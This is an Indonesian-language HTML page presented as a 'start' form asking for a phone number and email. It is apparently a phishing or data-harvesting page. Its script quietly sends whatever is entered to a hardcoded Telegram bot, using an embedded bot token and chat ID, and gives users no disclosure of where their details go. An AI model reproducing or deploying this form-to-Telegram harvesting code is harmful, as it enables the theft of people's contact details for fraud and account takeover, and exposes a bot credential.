<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1" /><title>Form Mulai</title><style>  body, html {    margin: 0; padding: 0;    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;    background: white;    height: 100vh;    display: flex;    flex-direction: column;  }  /* Bagian biru atas */  .header {    background: #0082fc;    height: 120px;    padding: 40px 20px 0 20px;    display: flex;    align-items: flex-start;    color: white;  }  .back-arrow {    font-size: 24px;    cursor: pointer;    user-select: none;  }  /* Container form putih dengan border atas bulat */  .form-container {    flex-grow: 1;    background: white;    border-top-left-radius: 20px;    border-top-right-radius: 20px;    padding: 30px 20px;    display: flex;    flex-direction: column;  }  .form-title {    font-size: 16px;    font-weight: 600;    color: #333;    margin-bottom: 35px;    line-height: 1.3;  }  label {    font-size: 14px;    font-weight: 500;    color: #5a5a5a;    margin-bottom: 5px;    display: block;  }  input[type="text"], input[type="email"] {    width: 100%;    padding: 12px 15px;    font-size: 14px;    border: none;    border-radius: 8px;    background: #d9ebff;    margin-bottom: 20px;    box-sizing: border-box;    color: #000;  }  input::placeholder {    color: #7a7a7a;  }  button {    width: 100%;    padding: 12px 0;    background: #ffc042;    border: none;    border-radius: 12px;    font-size: 16px;    font-weight: 600;    color: #333;    cursor: pointer;    user-select: none;    box-shadow: 0 2px 5px rgba(0,0,0,0.1);    transition: background-color 0.3s ease;  }  button:hover {    background: #e6ac36;  }</style></head><body>  <div class="header">    <div class="back-arrow" onclick="history.back();">&#8592;</div>  </div>  <div class="form-container">    <div class="form-title">      Masukkan nomor handphone dan email<br />Kamu untuk memulai    </div>    <form>      <label for="phone">Nomor Handphone</label>      <input id="phone" type="text" placeholder="+62" />      <label for="email">Email</label>      <input id="email" type="email" placeholder="Email" />      <button type="submit">Mulai</button>    </form>  </div>  <script>  // Ganti dengan token bot Telegram Anda  const TELEGRAM_BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM';  // Ganti dengan chat_id tujuan (bisa angka positif untuk user, atau negatif untuk grup)  const TELEGRAM_CHAT_ID = '7213790655';  // Ambil form  const form = document.querySelector('form');  form.addEventListener('submit', function(e) {    e.preventDefault(); // cegah reload halaman        // Ambil data dari input    const phone = document.getElementById('phone').value.trim();    const email = document.getElementById('email').value.trim();    if (!phone || !email) {      alert('Mohon isi nomor handphone dan email dengan benar.');      return;    }    // Membuat pesan yang akan dikirim ke Telegram    const message = `Data baru:\nNomor Handphone: ${phone}\nEmail: ${email}`;    // URL API Telegram untuk mengirim pesan    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;    // Kirim request POST ke Telegram API dengan fetch    fetch(url, {      method: 'POST',      headers: {        'Content-Type': 'application/json'      },      body: JSON.stringify({        chat_id: TELEGRAM_CHAT_ID,        text: message      })    })    .then(response => response.json())    .then(data => {      if (data.ok) {        alert('Data berhasil dikirim ke Telegram!');        // Reset form        form.reset();        // Bisa redirect atau aksi lainnya      } else {        alert('Terjadi kesalahan: ' + data.description);      }    })    .catch(error => {      alert('Gagal mengirim data: ' + error.message);    });  });</script></body></html>
